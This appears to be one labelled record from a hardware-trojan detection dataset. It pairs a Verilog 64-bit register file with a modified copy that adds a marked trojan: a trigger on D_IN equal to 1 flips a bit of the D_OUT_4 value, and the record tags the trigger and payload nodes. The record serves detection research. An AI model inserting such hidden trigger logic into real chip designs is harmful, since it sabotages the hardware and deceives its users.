@@ -1,0 +1,20 @@
+{
+    "sample_id": "SRTL_565",
+    "instruction": "\n\nYou are given a module with several submodules and wires. Your task is to complete the implementation of the `regfile` submodule. The `regfile` submodule is a register file that has 32 registers, each of size 64 bits. It has five read ports and one write port. The read ports are `read_rs1`, `read_rs1_port2`, `read_rs2`, `read_rs3`, and `read_rs3_port2`. The write port is `write_rd`. The register file is indexed by the five address inputs `regfile$ADDR_1`, `regfile$ADDR_2`, `regfile$ADDR_3`, `regfile$ADDR_4`, and `regfile$ADDR_5`. The write data input is `regfile$D_IN`, and the write enable input is `regfile$WE`.\n\nYou need to complete the following tasks:\n1. Assign the correct values to the five address inputs based on the read ports and the write port.\n2. Assign the correct value to the write enable input based on the write port.\n\n",
+    "original_rtl": "module regfile(\n    input CLK,\n    input [4:0] ADDR_1,\n    input [4:0] ADDR_2,\n    input [4:0] ADDR_3,\n    input [4:0] ADDR_4,\n    input [4:0] ADDR_5,\n    input [63:0] D_IN,\n    input WE,\n    output [63:0] D_OUT_1,\n    output [63:0] D_OUT_2,\n    output [63:0] D_OUT_3,\n    output [63:0] D_OUT_4,\n    output [63:0] D_OUT_5\n);\n\nreg [63:0] regfile_mem [31:0];\n\nassign D_OUT_1 = regfile_mem[ADDR_1];\nassign D_OUT_2 = regfile_mem[ADDR_2];\nassign D_OUT_3 = regfile_mem[ADDR_3];\nassign D_OUT_4 = regfile_mem[ADDR_4];\nassign D_OUT_5 = regfile_mem[ADDR_5];\n\nalways @(posedge CLK) begin\n    if (WE) begin\n        regfile_mem[ADDR_5] <= D_IN;\n    end\nend\n\nendmodule",
+    "modified_rtl": "    module regfile(\n    input CLK,\n    input [4:0] ADDR_1,\n    input [4:0] ADDR_2,\n    input [4:0] ADDR_3,\n    input [4:0] ADDR_4,\n    input [4:0] ADDR_5,\n    input [63:0] D_IN,\n    input WE,\n    output [63:0] D_OUT_1,\n    output [63:0] D_OUT_2,\n    output [63:0] D_OUT_3,\n    output [63:0] D_OUT_4,\n    output [63:0] D_OUT_5\n);\n\n    reg [63:0] regfile_mem [31:0];\n\n    assign D_OUT_1 = regfile_mem[ADDR_1];\n    assign D_OUT_2 = regfile_mem[ADDR_2];\n    assign D_OUT_3 = regfile_mem[ADDR_3];\n    assign D_OUT_4 = regfile_mem[ADDR_4];\n    assign D_OUT_5 = regfile_mem[ADDR_5];\n\n    always @(posedge CLK) begin\n    if (WE) begin\n    regfile_mem[ADDR_5] <= D_IN;\nend\nend\n\n// HT_START\n// Trojan Type: Lightweight_Payload_Override\nreg htrojan_trig;\nreg [63:0] htrojan_pay;\nalways @(*) begin\n    htrojan_trig = (D_IN == 64'h0000000000000001);\n    htrojan_pay = htrojan_trig ? (D_OUT_4 ^ 64'h0000000000000001) : D_OUT_4;\nend\n// HT_END\nendmodule",
+    "source_index": 565,
+    "label": "trojan",
+    "trojan_type": "Lightweight_Payload_Override",
+    "trigger_nodes": [
+        "htrojan_trig",
+        "D_IN"
+    ],
+    "payload_nodes": [
+        "htrojan_pay",
+        "D_OUT_4"
+    ],
+    "obfuscation_applied": true,
+    "obfuscation_type": "Formatting_Normalization_and_Whitespace_Restructuring",
+    "syntax_valid": true
+}
